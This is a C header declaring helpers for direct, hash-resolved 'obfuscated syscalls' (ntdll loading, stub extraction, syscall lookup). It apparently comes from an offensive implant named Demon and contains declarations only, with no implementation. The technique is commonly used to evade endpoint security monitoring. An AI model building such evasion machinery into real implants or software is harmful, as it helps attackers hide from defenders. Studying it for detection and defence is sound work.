
#ifndef DEMON_SYSCALLS_H
#define DEMON_SYSCALLS_H

#include <windows.h>

/* use Native.h */
#include <Common/Native.h>

#define WIN_FUNC(x) __typeof__(x) * x;

#define OBJ_CASE_INSENSITIVE	    0x40
#define STATUS_IMAGE_NOT_AT_BASE    0x40000003

#define MAX_SYSCALL_STUB_SIZE	    64
#define MAX_NUMBER_OF_SYSCALLS	    1024

typedef struct _SYSCALL_STUB
{
    PVOID Stub;
    PCHAR Hash;
} SYSCALL_STUB, *PSYSCALL_STUB;

// Obfuscated syscalls
PVOID SyscallLdrNtdll( );
BOOL  SyscallsInit( );
UINT  SyscallsExtract( ULONG_PTR pNtdll, PSYSCALL_STUB Syscalls );
PVOID SyscallsObf( PSYSCALL_STUB Syscalls, UINT uiCount, DWORD dwSyscallNameHash );

#endif
